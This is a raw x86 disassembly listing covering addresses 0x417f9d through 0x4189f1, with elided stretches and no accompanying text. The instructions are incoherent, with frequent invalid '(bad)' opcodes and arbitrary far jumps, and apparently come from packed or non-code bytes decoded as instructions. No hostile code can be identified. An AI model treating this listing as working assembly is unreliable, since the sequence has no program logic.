  417f9d:	es in  al,dx
  417f9f:	rcr    DWORD PTR [esi],0x6c
  417fa2:	mov    bl,0x66
  417fa4:	daa    
  417fa5:	sub    dl,BYTE PTR [eax+ecx*8-0x52fc7133]
  417fac:	cwde   
  417fad:	or     eax,DWORD PTR [edx]
  417faf:	jmp    FWORD PTR [ebp-0x4ff57138]
  417fb5:	scas   al,BYTE PTR es:[edi]
  417fb6:	sub    al,BYTE PTR [ebx]
  417fb8:	inc    esi
  417fb9:	lock mov ch,0x24
  417fbc:	push   ecx
  417fbd:	sub    eax,0x71fc2fce
  417fc2:	jp     0x418020
  417fc4:	jmp    0x7850:0xe3a57d7c
  417fcb:	adc    eax,0x7e4aa02a
  417fd0:	dec    ecx
  417fd1:	fisub  WORD PTR [eax+0x1e]
  417fd4:	mov    edx,edi
  417fd6:	nop
  417fd7:	jle    0x417fb4
  417fd9:	(bad)  [eax+edx*1-0x1426f8cf]
  417fe0:	jns    0x417fa3
  417fe2:	(bad)  [edx]
  417fe4:	pop    edx
  417fe5:	and    bl,BYTE PTR [edi]
  417fe7:	pop    ss
  417fe8:	pushf  
  417fe9:	or     ebx,DWORD PTR [edi]
  417feb:	xchg   BYTE PTR ds:0x6715bda7,dh
  417ff1:	nop
  417ff2:	mov    BYTE PTR [ebx+0x26],0x1f
  417ff6:	sbb    al,0x51
  417ff8:	mov    DWORD PTR [esi-0x5000a4a3],ebp
  417ffe:	icebp  
  417fff:	neg    DWORD PTR [ebx+0x1e]
  418002:	sbb    al,0x88
  418004:	mov    ch,0xd
  418006:	loop   0x417fbc
  418008:	mov    esp,0x9a866ea1
  41800d:	call   FWORD PTR [ecx-0x4]
  418010:	inc    eax
  418011:	pushf  
  418012:	fsubr  DWORD PTR [edi]
  418014:	mov    ecx,0xcd0c4e32
  418019:	sub    al,0x72
  41801b:	lock pop ecx
  41801d:	or     edx,ebp
  41801f:	push   cs
  418020:	cs and ch,ch
  418023:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418024:	je     0x417fc5
  418026:	scas   al,BYTE PTR es:[edi]
  418027:	ins    BYTE PTR es:[edi],dx
  418028:	adc    eax,0xef03395e
  41802d:	stos   BYTE PTR es:[edi],al
  41802e:	outs   dx,BYTE PTR ds:[esi]
  41802f:	retf   0xa147
  418032:	sar    DWORD PTR [eax],cl
  418034:	pop    edi
	...
  418095:	add    BYTE PTR [ecx-0xba9482],ch
  41809b:	push   ebp
  41809c:	scas   eax,DWORD PTR es:[edi]
  41809d:	dec    BYTE PTR [ecx-0x2144673c]
  4180a3:	xchg   ecx,eax
  4180a4:	sub    bh,BYTE PTR [eax+0x21]
  4180a7:	cld    
  4180a8:	add    BYTE PTR [eax],al
  4180aa:	pop    es
  4180ab:	add    DWORD PTR [eax],eax
  4180ad:	add    bh,bh
  4180af:	add    eax,0xdfb17aa1
  4180b4:	ret    
  4180b5:	sub    BYTE PTR [edx+ecx*8+0x50993dac],bl
  4180bc:	je     0x4180e6
  4180be:	fist   DWORD PTR [edx+0x53]
  4180c1:	push   esp
  4180c2:	scas   eax,DWORD PTR es:[edi]
  4180c3:	inc    ebp
  4180c4:	aaa    
  4180c5:	pop    ss
  4180c6:	inc    ebx
  4180c7:	mov    ds,WORD PTR [esi+0x576837b9]
  4180cd:	sub    bh,BYTE PTR [esi+eax*8]
  4180d0:	adc    BYTE PTR [esi+ecx*1],al
  4180d3:	jmp    0x9fc4:0x457f0d0c
  4180da:	mov    ch,0x86
  4180dc:	ret    0x2691
  4180df:	sar    DWORD PTR [edi-0x4f],0x7
  4180e3:	(bad)  
  4180e4:	push   edi
  4180e5:	sbb    ebx,DWORD PTR [ebp+0x32]
  4180e8:	(bad)  
  4180e9:	jl     0x41811b
  4180eb:	jns    0x41808e
  4180ed:	popa   
  4180ee:	fnstenv [edi]
  4180f0:	adc    eax,0xcf953c46
  4180f5:	clc    
  4180f6:	jmp    0xbcbf:0xfa44d4e7
  4180fd:	loopne 0x41809c
  4180ff:	and    eax,DWORD PTR [esi-0x3b]
  418102:	cmp    BYTE PTR [ebp+0x3c],al
  418105:	jns    0x4180e4
  418107:	add    ch,BYTE PTR [eax-0x1d]
  41810a:	in     al,dx
  41810b:	hlt    
  41810c:	dec    esp
  41810d:	fs in  eax,0xc7
  418110:	pop    esp
  418111:	loopne 0x4180a9
  418113:	shr    dh,1
  418115:	pop    ss
  418116:	retf   0x6fd4
  418119:	les    ebp,FWORD PTR [ebp-0x1d]
  41811c:	push   es
  41811d:	enter  0x1ec3,0xd1
  418121:	ds mov ebx,ebx
  418124:	jmp    0xfe1f:0x1dcc20bd
  41812b:	clc    
  41812c:	repz arpl ax,bx
  41812f:	js     0x4180f6
  418131:	xchg   ecx,eax
  418132:	adc    DWORD PTR [ecx+0x34c346f9],ebp
  418138:	adc    bh,BYTE PTR [ecx+0x755b6562]
  41813e:	cmp    dl,BYTE PTR [edi+0x51e28224]
  418144:	stos   DWORD PTR es:[edi],eax
  418145:	add    eax,0x2299d38c
  41814a:	jns    0x41814f
  41814c:	adc    DWORD PTR [ebx+ebx*2+0xfc1bdef],esi
  418153:	xchg   DWORD PTR [edi],edx
  418155:	retf   0x6552
  418158:	fidiv  WORD PTR [eax-0x547c995c]
  41815e:	add    DWORD PTR [ecx],esp
  418160:	xchg   dl,cl
  418162:	outs   dx,DWORD PTR ds:[esi]
  418163:	mov    eax,0xd9ae3331
  418168:	xchg   ebx,eax
  418169:	xchg   BYTE PTR [esp+esi*8],ch
  41816c:	dec    eax
  41816d:	cdq    
  41816e:	imul   esp,DWORD PTR [edx+0x5],0xdb5a64d8
  418175:	ret    0xba54
  418178:	xor    BYTE PTR [ebx-0x3ba34eb2],dh
  41817e:	das    
  41817f:	cmp    eax,0xb2a77dcf
  418184:	mov    al,ds:0xe8c55900
  418189:	xor    eax,DWORD PTR [eax-0x10b3b5b]
  41818f:	push   ss
  418190:	and    eax,0xa04f85c8
  418195:	add    BYTE PTR [edx-0x39],bl
  418198:	je     0x418133
  41819a:	or     edx,ebx
  41819c:	clc    
  41819d:	pop    esi
  41819e:	dec    ecx
  41819f:	out    dx,al
  4181a0:	and    al,0x36
  4181a2:	add    DWORD PTR [edx-0x37],eax
  4181a5:	iret   
  4181a6:	repz cs (bad) 
  4181a9:	iret   
  4181aa:	jmp    0x4181be
  4181ac:	fcomp  QWORD PTR [eax]
  4181ae:	push   esi
  4181af:	xchg   esp,eax
  4181b0:	sub    DWORD PTR [ecx+0xde3865],0x0
	...
  418213:	add    BYTE PTR [eax],al
  418215:	add    BYTE PTR [edi],dh
  418217:	xchg   edx,eax
  418218:	and    al,0x83
  41821a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41821b:	mov    bh,0xb7
  41821d:	mov    dh,0x16
  41821f:	mov    cl,ch
  418221:	(bad)  
  418222:	xchg   ecx,eax
  418223:	ja     0x41827d
  418225:	aam    0x28
  418227:	std    
  418228:	add    BYTE PTR [eax],al
  41822a:	pop    es
  41822b:	add    DWORD PTR [eax],eax
  41822d:	add    BYTE PTR [edi+0x22],bh
  418230:	adc    al,0x3d
  418232:	jae    0x4182a7
  418234:	(bad)
  418237:	out    dx,al
  418238:	std    
  418239:	or     ecx,DWORD PTR [eax-0x67482e56]
  41823f:	cwde   
  418240:	add    eax,0x17bf0ce0
  418245:	fucomi st,st(7)
  418247:	xor    al,0xe9
  418249:	sub    BYTE PTR [ecx-0x4c438a5e],bl
  41824f:	ins    DWORD PTR es:[edi],dx
  418250:	je     0x4182a2
  418252:	mov    ch,BYTE PTR [edi+ecx*2+0x30]
  418256:	ror    esi,cl
  418258:	push   eax
  418259:	shl    DWORD PTR [esi-0x43af73fd],1
  41825f:	popa   
  418260:	jp     0x4182c9
  418262:	dec    edx
  418263:	ja     0x4182a9
  418265:	mov    al,0xbc
  418267:	jno    0x41822f
  418269:	rcl    BYTE PTR [esi+0x470fbffe],0x97
  418270:	or     DWORD PTR [edi],esp
  418272:	ss aas 
  418274:	popf   
  418275:	add    esp,ebx
  418277:	outs   dx,DWORD PTR ds:[esi]
  418278:	sub    DWORD PTR [eax+eiz*4],ebx
  41827b:	scas   al,BYTE PTR es:[edi]
  41827c:	lock into 
  41827e:	jge    0x418223
  418280:	xlat   BYTE PTR ds:[ebx]
  418281:	push   edx
  418282:	test   ah,ah
  418284:	ret    0x8854
  418287:	jmp    0x62555e18
  41828c:	push   esi
  41828d:	fxch   st(3)
  41828f:	mov    al,0x33
  418291:	fucomp st(7)
  418293:	dec    edi
  418294:	popa   
  418295:	mov    edx,0x8a5dc8f
  41829a:	test   DWORD PTR [esi],esp
  41829c:	std    
  41829d:	test   BYTE PTR [ecx-0x18],cl
  4182a0:	out    0x31,eax
  4182a2:	dec    esi
  4182a3:	push   ds
  4182a4:	addr16 out 0x74,eax
  4182a7:	dec    edx
  4182a8:	ja     0x41827f
  4182aa:	and    DWORD PTR [esi+0x3b],esi
  4182ad:	xor    eax,0xb94394eb
  4182b2:	add    BYTE PTR [ebp-0x50755636],ah
  4182b8:	iret   
  4182b9:	jb     0x418284
  4182bb:	call   0xd9b2de22
  4182c0:	mov    al,0x92
  4182c2:	cmc    
  4182c3:	push   0x73
  4182c5:	xchg   BYTE PTR [ecx+0x32d2138d],al
  4182cb:	and    al,0x5a
  4182cd:	fstp   DWORD PTR ds:0x75072791
  4182d3:	mov    esp,0x7436f21b
  4182d8:	das    
  4182d9:	mov    ch,0x79
  4182db:	int    0xc6
  4182dd:	mul    DWORD PTR [edi]
  4182df:	pop    ebp
  4182e0:	jmp    DWORD PTR [eax-0x79]
  4182e3:	aaa    
  4182e4:	pop    edx
  4182e5:	adc    edx,esp
  4182e7:	std    
  4182e8:	repnz sar DWORD PTR [edi-0x62],1
  4182ec:	sbb    dl,ah
  4182ee:	scas   eax,DWORD PTR es:[edi]
  4182ef:	(bad)  
  4182f0:	mov    ebx,0x6982bf6d
  4182f5:	mov    ch,0x62
  4182f7:	iretw  
  4182f9:	imul   esi,DWORD PTR [ecx-0x7f],0x66ac95cd
  418300:	call   0xc5fa:0xef25daa3
  418307:	pusha  
  418308:	sub    al,0xb8
  41830a:	std    
  41830b:	(bad)  
  41830c:	jnp    0x41834e
  41830e:	cli    
  41830f:	or     ecx,DWORD PTR [ecx]
  418311:	mov    DWORD PTR [ebp+0x17b68fdd],ebp
  418317:	mov    dh,0xff
  418319:	push   ecx
  41831a:	dec    esp
  41831b:	pop    edx
  41831c:	out    0x76,al
  41831e:	imul   edi,DWORD PTR [ebp+0x3675d708],0xc39c0402
  418328:	fsubp  st(7),st
  41832a:	ds std 
  41832c:	xor    esp,DWORD PTR [edx+0x5e]
  41832f:	ret    
  418330:	retf   
  418331:	leave  
  418332:	mov    al,ds:0x1007
	...
  418393:	add    BYTE PTR [eax],al
  418395:	add    ah,bl
  418397:	mov    bl,0x3f
  418399:	push   eax
  41839a:	jg     0x418378
  41839c:	(bad)  
  41839d:	mov    edi,0xc253ee23
  4183a2:	ror    DWORD PTR [ebx-0x49],cl
  4183a5:	jns    0x4183d6
  4183a7:	inc    BYTE PTR [eax]
  4183a9:	add    BYTE PTR [edi],al
  4183ab:	add    DWORD PTR [eax],eax
  4183ad:	add    BYTE PTR [eax],ch
  4183af:	jl     0x4183dd
  4183b1:	pop    es
  4183b2:	(bad)  
  4183b4:	xor    eax,0xc6cae8be
  4183b9:	call   0xf5b59c16
  4183be:	aam    0xb
  4183c0:	aas    
  4183c1:	ret    0x61de
  4183c4:	inc    edx
  4183c5:	sti    
  4183c6:	addr16 das 
  4183c8:	jno    0x418432
  4183ca:	loopne 0x418386
  4183cc:	inc    eax
  4183cd:	int    0xa0
  4183cf:	add    al,0xce
  4183d1:	fisttp QWORD PTR [ebx-0x7833997c]
  4183d7:	add    ebx,DWORD PTR [eax-0xa5aaecb]
  4183dd:	retf   
  4183de:	cdq    
  4183df:	cmp    DWORD PTR [eax-0x2d],edi
  4183e2:	mov    dh,0xe
  4183e4:	lahf   
  4183e5:	fidivr WORD PTR [ecx]
  4183e7:	add    BYTE PTR [edi-0x6bae8f2a],dl
  4183ed:	push   es
  4183ee:	into   
  4183ef:	fadd   st,st(7)
  4183f1:	add    ah,BYTE PTR [edx-0x2d706d1]
  4183f7:	cmc    
  4183f8:	call   FWORD PTR [eax+eiz*2+0x3fe1c98c]
  4183ff:	jmp    0xc1d4:0x4cc75740
  418406:	jb     0x4183c4
  418408:	ja     0x41845a
  41840a:	leave  
  41840b:	nop
  41840c:	mov    al,ds:0x3dd142d2
  418411:	mov    al,0xf3
  418413:	div    DWORD PTR [edx+0x39]
  418416:	das    
  418417:	jb     0x418450
  418419:	cs xchg edx,eax
  41841b:	lds    esi,FWORD PTR [ebx+0x4]
  41841e:	add    al,0xcb
  418420:	aam    0xf4
  418422:	mov    dl,BYTE PTR ss:[esi+esi*1-0x31]
  418427:	inc    ebx
  418428:	sub    eax,0x5215f3d4
  41842d:	xchg   edx,eax
  41842e:	mov    edx,0xe7b50d69
  418433:	outs   dx,DWORD PTR ds:[esi]
  418434:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418435:	push   cs
  418436:	push   edx
  418437:	pop    ebp
  418438:	inc    eax
  418439:	sbb    DWORD PTR gs:0x52e9d32c,ecx
  418440:	jge    0x418427
  418442:	pop    es
  418443:	leave  
  418444:	jecxz  0x418407
  418446:	out    0x10,al
  418448:	outs   dx,BYTE PTR ds:[esi]
  418449:	(bad)  
  41844b:	mov    ebp,0x6489941f
  418450:	pop    ds
  418451:	sti    
  418452:	jno    0x418456
  418454:	sbb    al,0xc3
  418456:	push   edx
  418457:	cmp    ecx,ebx
  418459:	pop    edx
  41845a:	cmp    esi,DWORD PTR [ecx]
  41845c:	mov    dl,0xf7
  41845e:	leave  
  41845f:	shl    BYTE PTR [eax+edi*8],cl
  418462:	dec    eax
  418463:	cmp    al,0x27
  418465:	push   esp
  418466:	(bad)  
  418467:	inc    esp
  418468:	fnstenv [ebx+0x7e]
  41846b:	xchg   ecx,eax
  41846c:	mov    ch,0x6e
  41846e:	arpl   WORD PTR [edi-0x53f0dd72],bp
  418474:	fst    st(4)
  418476:	add    dl,ah
  418478:	clc    
  418479:	loope  0x418499
  41847b:	cwde   
  41847c:	(bad)  
  41847d:	out    dx,al
  41847e:	leave  
  41847f:	pop    edi
  418480:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418481:	test   al,0x1a
  418483:	or     bh,BYTE PTR [edx-0x7d]
  418486:	bound  ebx,QWORD PTR [esi]
  418488:	jmp    0xc934:0xf283d52
  41848f:	shr    BYTE PTR [eax+edx*1-0x76],1
  418493:	repnz hlt 
  418495:	xchg   esp,eax
  418496:	in     al,dx
  418497:	into   
  418498:	jmp    0x3148d907
  41849d:	push   0xfffffff1
  41849f:	inc    esp
  4184a0:	xchg   ecx,eax
  4184a1:	pop    ss
  4184a2:	push   cs
  4184a3:	outs   dx,BYTE PTR ds:[esi]
  4184a4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4184a5:	(bad)
  4184a9:	jnp    0x4184ba
  4184ab:	jecxz  0x418526
  4184ad:	xchg   esp,eax
  4184ae:	ins    DWORD PTR es:[edi],dx
  4184af:	les    esi,FWORD PTR [edi-0x405687c3]
	...
  418515:	add    BYTE PTR [ecx-0x7],al
  418518:	mov    ebx,ebx
  41851a:	mov    ebx,0x26fb51fb
  41851f:	xchg   edi,eax
  418520:	mov    ecx,DWORD PTR [eax+edi*8+0x363805d1]
  418527:	inc    DWORD PTR [eax]
  418529:	add    BYTE PTR [edi],al
  41852b:	add    DWORD PTR [eax],eax
  41852d:	add    BYTE PTR [edi-0xa],ch
  418530:	jo     0x4184ee
  418532:	sbb    ecx,0x383f3a83
  418538:	sub    BYTE PTR [ebp+0x49],bh
  41853b:	data16 adc ch,BYTE PTR ds:0xb639ce98
  418542:	dec    eax
  418543:	xchg   ebx,esp
  418545:	dec    ebx
  418546:	mov    ah,0x37
  418548:	push   cs
  418549:	jmp    0x41858d
  41854b:	ss sbb eax,0x55e21eef
  418551:	cli    
  418552:	outs   dx,BYTE PTR ds:[esi]
  418553:	xlat   BYTE PTR ds:[ebx]
  418554:	aas    
  418555:	cmp    ch,dh
  418557:	push   esp
  418558:	mov    bh,0x32
  41855a:	(bad)  
  41855b:	ficomp WORD PTR ds:0x2c1802dc
  418561:	mov    WORD PTR [edx+0x76bc772c],gs
  418567:	out    dx,al
  418568:	sub    edx,DWORD PTR [eax+0x75]
  41856b:	pop    ds
  41856c:	jle    0x4185c9
  41856e:	cmp    ah,BYTE PTR [eax]
  418570:	push   edx
  418571:	jnp    0x41856b
  418573:	mov    dh,0xde
  418575:	jae    0x4185b4
  418577:	test   DWORD PTR [ebp+0xb],0xdae20655
  41857e:	ins    BYTE PTR es:[edi],dx
  41857f:	xchg   bh,bh
  418581:	cmp    eax,0x288b71f5
  418586:	test   dh,ah
  418588:	cld    
  418589:	(bad)  
  41858a:	mul    BYTE PTR [ebp-0x7c]
  41858d:	clc    
  41858e:	dec    eax
  41858f:	imul   esi,DWORD PTR ds:0x95f04555,0xe0569fe6
  418599:	lock stos BYTE PTR es:[edi],al
  41859b:	mov    dh,al
  41859d:	jg     0x4185cc
  41859f:	mov    edi,0x975e59e1
  4185a4:	pop    esp
  4185a5:	mov    ecx,DWORD PTR [ecx]
  4185a7:	xor    DWORD PTR [ebx+0x173fe98],esi
  4185ad:	cs xchg ecx,eax
  4185af:	push   esp
  4185b0:	shl    bl,0x59
  4185b3:	repnz sbb edx,edi
  4185b6:	sbb    dl,BYTE PTR [ebx]
  4185b8:	fist   DWORD PTR [ecx]
  4185ba:	lock xor DWORD PTR [edi-0x62],eax
  4185be:	jnp    0x4185d9
  4185c0:	push   ebp
  4185c1:	popa   
  4185c2:	adc    bh,BYTE PTR [ebp+0x3b]
  4185c5:	stos   BYTE PTR es:[edi],al
  4185c6:	or     ebx,DWORD PTR [edi-0x3a33a782]
  4185cc:	ins    BYTE PTR es:[edi],dx
  4185cd:	leave  
  4185ce:	sub    DWORD PTR [ebp+0x45],ecx
  4185d1:	les    edi,FWORD PTR [ebx+0x40]
  4185d4:	ror    ebp,0xa6
  4185d7:	xor    eax,ebx
  4185d9:	pop    edx
  4185da:	imul   esp
  4185dc:	or     ch,BYTE PTR [eax+0x5afc7d06]
  4185e2:	add    al,0xc9
  4185e4:	sti    
  4185e5:	in     eax,0xa2
  4185e7:	sahf   
  4185e8:	pop    eax
  4185e9:	test   al,0xe4
  4185eb:	pop    ecx
  4185ec:	mov    es,WORD PTR [edi]
  4185ee:	dec    esi
  4185ef:	enter  0x3609,0xc9
  4185f3:	push   ds
  4185f4:	cmp    al,0x7a
  4185f6:	mov    al,0x33
  4185f8:	scas   al,BYTE PTR es:[edi]
  4185f9:	ret    
  4185fa:	sbb    al,0xad
  4185fc:	add    DWORD PTR [ecx-0x7],ebp
  4185ff:	mov    al,0x5e
  418601:	mov    dl,0x39
  418603:	dec    ebx
  418604:	dec    esp
  418605:	ret    0x233b
  418608:	jmp    0x7a84b762
  41860d:	leave  
  41860e:	adc    eax,0x3cf7877d
  418613:	pop    ecx
  418614:	add    ebp,DWORD PTR cs:[ebx+ecx*1-0x7c70fd42]
  41861c:	mov    ah,0x8e
  41861e:	adc    al,0x73
  418620:	in     eax,0xdf
  418622:	sbb    edx,DWORD PTR [ebx+edx*2+0x39]
  418626:	shl    DWORD PTR [edx+0x10],0xb
  41862a:	dec    ebp
  41862b:	fcom   st(2)
  41862d:	add    cl,BYTE PTR [edx+0x4b]
  418630:	loope  0x41868f
  418632:	int3   
  418633:	rcr    DWORD PTR [edi+0x0],0x0
	...
  418693:	add    BYTE PTR [eax],al
  418695:	add    BYTE PTR [ebx-0x44c35fd8],dl
  41869b:	mov    esp,0xba07af9f
  4186a0:	xor    BYTE PTR [esi-0x7155758f],bh
  4186a6:	cmp    eax,0x7000100
  4186ab:	add    DWORD PTR [eax],eax
  4186ad:	add    BYTE PTR [ebx],ch
  4186af:	dec    eax
  4186b0:	pusha  
  4186b1:	jl     0x4186cf
  4186b3:	push   ecx
  4186b4:	shl    BYTE PTR [esi+0x32],cl
  4186b7:	lahf   
  4186b8:	sbb    DWORD PTR [edi+ebx*4+0x18c0a174],esp
  4186bf:	test   BYTE PTR [ebx+ebx*2-0x67],ch
  4186c3:	gs out dx,al
  4186c5:	call   0xe665:0xd467894a
  4186cc:	mov    ecx,0xf8fbc010
  4186d1:	js     0x41872b
  4186d3:	popa   
  4186d4:	adc    eax,0x379ac57d
  4186d9:	setp   BYTE PTR [edx+0xd]
  4186dd:	(bad)  
  4186de:	outs   dx,BYTE PTR ds:[esi]
  4186df:	call   0xa4324f67
  4186e4:	dec    ebp
  4186e5:	xchg   bh,ch
  4186e7:	push   ss
  4186e8:	jmp    0x581022f4
  4186ed:	adc    DWORD PTR [ecx+0x1c],ecx
  4186f0:	out    0xb2,al
  4186f2:	push   esi
  4186f3:	das    
  4186f4:	idiv   edi
  4186f6:	dec    esp
  4186f7:	add    ch,0x7
  4186fa:	xchg   ecx,eax
  4186fb:	mov    BYTE PTR [edi+ecx*1-0x1ba8d7b3],dl
  418702:	nop
  418703:	and    eax,eax
  418705:	mov    ebx,0x5ebc046b
  41870a:	xor    BYTE PTR [ecx+0xe],bh
  41870d:	test   DWORD PTR [edx],0x8b1f0ca1
  418713:	(bad)  
  418714:	aaa    
  418715:	cld    
  418716:	xor    eax,0x418f9937
  41871b:	cs call 0x43804ff1
  418721:	shl    DWORD PTR [ebx+0x2b],cl
  418724:	ins    DWORD PTR es:[edi],dx
  418725:	inc    esi
  418726:	(bad)  
  418727:	push   eax
  418728:	fsub   st(7),st
  41872a:	push   0x28
  41872c:	sbb    al,0x56
  41872e:	and    eax,0x45e49129
  418733:	cwde   
  418734:	push   esp
  418735:	loop   0x4187b3
  418737:	jnp    0x4186eb
  418739:	inc    esi
  41873a:	sub    ebp,edx
  41873c:	lahf   
  41873d:	sub    al,0xba
  41873f:	cmp    bl,bl
  418741:	pusha  
  418742:	loope  0x41876b
  418744:	mov    al,ds:0xb296c75a
  418749:	dec    esp
  41874a:	lods   eax,DWORD PTR ds:[esi]
  41874b:	aam    0x99
  41874d:	pop    ebx
  41874e:	call   0x7b6d:0x2a252734
  418755:	loop   0x41875e
  418757:	sub    al,0xb5
  418759:	sbb    eax,0xda80f1d4
  41875e:	adc    al,bl
  418760:	sub    al,0x1b
  418762:	icebp  
  418763:	in     al,dx
  418764:	xchg   bx,ax
  418766:	pop    ss
  418767:	test   al,0xdf
  418769:	jge    0x41872e
  41876b:	loop   0x418761
  41876d:	es push edx
  41876f:	lds    ebx,FWORD PTR [ebp-0x7a95c939]
  418775:	stos   DWORD PTR es:[edi],eax
  418776:	sbb    ah,BYTE PTR [edx]
  418778:	push   ecx
  418779:	or     dh,al
  41877b:	repnz or al,0xe4
  41877e:	xor    al,0x23
  418780:	xchg   edi,eax
  418781:	jb     0x418797
  418783:	sub    al,0x66
  418785:	in     eax,dx
  418786:	cmp    BYTE PTR [edx-0x4356c153],dh
  41878c:	add    al,BYTE PTR [edx+0x5]
  41878f:	sbb    bh,bl
  418791:	cmp    eax,0x40d4472e
  418796:	(bad)  
  418797:	sub    DWORD PTR ds:0xeb2659d6,ebp
  41879d:	outs   dx,BYTE PTR ds:[esi]
  41879e:	cld    
  41879f:	stos   BYTE PTR es:[edi],al
  4187a0:	xchg   esi,eax
  4187a1:	push   esp
  4187a2:	mov    dl,0xd6
  4187a4:	leave  
  4187a5:	jmp    FWORD PTR [esp+eax*2]
  4187a8:	add    esp,DWORD PTR ds:0xda3a9fc9
  4187ae:	or     al,0xf4
  4187b0:	call   0x3ac72946
	...
  418815:	add    BYTE PTR [eax+ecx*8-0x80bcc9],dl
  41881c:	hlt    
  41881d:	fisttp WORD PTR [eax]
  41881f:	test   eax,0xcdee7be5
  418824:	mov    ds:0x101444e,eax
  418829:	add    BYTE PTR [edi],al
  41882b:	add    DWORD PTR [eax],eax
  41882d:	add    BYTE PTR [eax],bh
  41882f:	fmul   QWORD PTR ds:0x64db391d
  418835:	dec    ebx
  418836:	js     0x4187ee
  418838:	ss aas 
  41883a:	push   ebp
  41883b:	stos   DWORD PTR es:[edi],eax
  41883c:	mov    ebp,0xdbb0ea8f
  418841:	cld    
  418842:	jbe    0x41883c
  418844:	xor    edi,DWORD PTR [ebp-0x3a6c8ac0]
  41884a:	dec    edx
  41884b:	shl    BYTE PTR [ebp-0x2d7e0d4],cl
  418851:	in     eax,dx
  418852:	mov    edi,0xe22e6337
  418857:	aas    
  418858:	sbb    al,0x5
  41885a:	push   0x34
  41885c:	jle    0x4187ef
  41885e:	adc    dl,BYTE PTR [esi-0x2a]
  418861:	je     0x418848
  418863:	push   edx
  418864:	adc    dh,BYTE PTR [edi+0x326dae1]
  41886a:	sub    DWORD PTR [esi+ebp*8+0x42],0xe9fd9b99
  418872:	pop    edx
  418873:	loop   0x41881b
  418875:	sahf   
  418876:	sub    BYTE PTR ds:0xc2c1b7e9,bh
  41887c:	inc    ecx
  41887d:	mov    cl,0xe6
  41887f:	adc    al,0x86
  418881:	sahf   
  418882:	stc    
  418883:	dec    edi
  418884:	mov    cl,dh
  418886:	pop    esp
  418887:	scas   eax,DWORD PTR es:[edi]
  418888:	sbb    DWORD PTR [edi+ecx*8+0x54a643fa],esi
  41888f:	sbb    al,0x7b
  418891:	pop    ebx
  418892:	add    BYTE PTR [eax],cl
  418894:	ror    ch,1
  418896:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418897:	inc    ebp
  418898:	inc    ebp
  418899:	lods   eax,DWORD PTR ds:[esi]
  41889a:	bound  ebp,QWORD PTR ds:0x33729bf5
  4188a0:	dec    esp
  4188a1:	call   0xecdf419e
  4188a6:	stos   BYTE PTR es:[edi],al
  4188a7:	mov    bh,0xf
  4188a9:	adc    DWORD PTR [esi],esp
  4188ab:	fsubr  QWORD PTR [edx]
  4188ad:	mov    WORD PTR [edi+0x5e5eb7a8],es
  4188b3:	out    0x40,al
  4188b5:	xchg   esp,eax
  4188b6:	cld    
  4188b7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4188b8:	std    
  4188b9:	aaa    
  4188ba:	push   ebx
  4188bb:	cmc    
  4188bc:	jnp    0x418885
  4188be:	or     esi,ebp
  4188c0:	cmp    eax,0xa373aed1
  4188c6:	mov    ds:0x508911ac,al
  4188cb:	mov    ecx,0xcb3a9deb
  4188d0:	dec    ecx
  4188d1:	ja     0x41891d
  4188d3:	inc    ebp
  4188d4:	sub    edi,0xffffffbd
  4188d7:	sub    DWORD PTR [ebx+0x6e],ebp
  4188da:	adc    al,0xfd
  4188dc:	call   DWORD PTR [ebx-0x593cddd7]
  4188e2:	xor    al,0x51
  4188e4:	mov    WORD PTR [ebp+0x7743aeb3],?
  4188ea:	mov    dl,0x9b
  4188ec:	xor    esi,ebp
  4188ee:	sub    esi,ebp
  4188f0:	pop    edx
  4188f1:	mov    DWORD PTR [edx],eax
  4188f3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4188f4:	jle    0x4188be
  4188f6:	push   ebp
  4188f7:	or     al,0x69
  4188f9:	lods   eax,DWORD PTR ds:[esi]
  4188fa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4188fb:	int    0x62
  4188fd:	push   ecx
  4188fe:	pop    esp
  4188ff:	data16 jl 0x41891e
  418902:	je     0x41895e
  418904:	cmp    DWORD PTR [ebx+0xf438038],ecx
  41890a:	pop    eax
  41890b:	push   ebx
  41890c:	pop    esi
  41890d:	mov    esp,0x897174b7
  418912:	cmp    ch,BYTE PTR [ebx+eax*2+0x11]
  418916:	in     al,dx
  418917:	jo     0x418941
  418919:	mov    ebx,esi
  41891b:	xchg   ch,cl
  41891d:	xor    esi,edx
  41891f:	das    
  418920:	push   ss
  418921:	inc    ecx
  418922:	not    DWORD PTR [edi+0x46ba7fce]
  418928:	mov    ebp,0x2b5ce975
  41892d:	fist   DWORD PTR [esi]
  41892f:	and    eax,0xb3e3fb99
  418934:	add    BYTE PTR [eax],0x0
	...
  418993:	add    BYTE PTR [eax],al
  418995:	add    BYTE PTR [ecx+edx*4-0x28a2e9ac],cl
  41899c:	into   
  41899d:	fwait
  41899e:	cmc    
  41899f:	pop    edx
  4189a0:	sub    ecx,DWORD PTR [esi-0x504b970e]
  4189a6:	dec    ebx
  4189a7:	add    al,BYTE PTR [ecx]
  4189a9:	add    BYTE PTR [edi],al
  4189ab:	add    DWORD PTR [eax],eax
  4189ad:	add    bl,ch
  4189af:	ds aas 
  4189b1:	arpl   bx,bx
  4189b3:	jle    0x418a10
  4189b5:	cmp    BYTE PTR [ecx+0x53],0x4e
  4189b9:	jno    0x418a01
  4189bb:	ins    BYTE PTR es:[edi],dx
  4189bc:	arpl   WORD PTR [esi+eax*8+0x6d9ccd87],di
  4189c3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4189c4:	dec    ebx
  4189c5:	das    
  4189c6:	ins    BYTE PTR es:[edi],dx
  4189c7:	fbld   TBYTE PTR [esi-0x7502994d]
  4189cd:	mov    edx,0x76307d4e
  4189d2:	and    al,0xd7
  4189d4:	fcmovnbe st,st(3)
  4189d6:	inc    ebx
  4189d7:	aaa    
  4189d8:	rcr    DWORD PTR [ecx+0x57],0x45
  4189dc:	and    al,0x50
  4189de:	iret   
  4189df:	test   DWORD PTR gs:[ebx+eax*1-0x2c],eax
  4189e4:	cdq    
  4189e5:	imul   ebx,DWORD PTR [esi-0x2b],0xcb6d43d4
  4189ec:	enter  0x2120,0xf0
  4189f0:	xchg   edi,eax
  4189f1:	scas   al,BYTE PTR es:[edi]
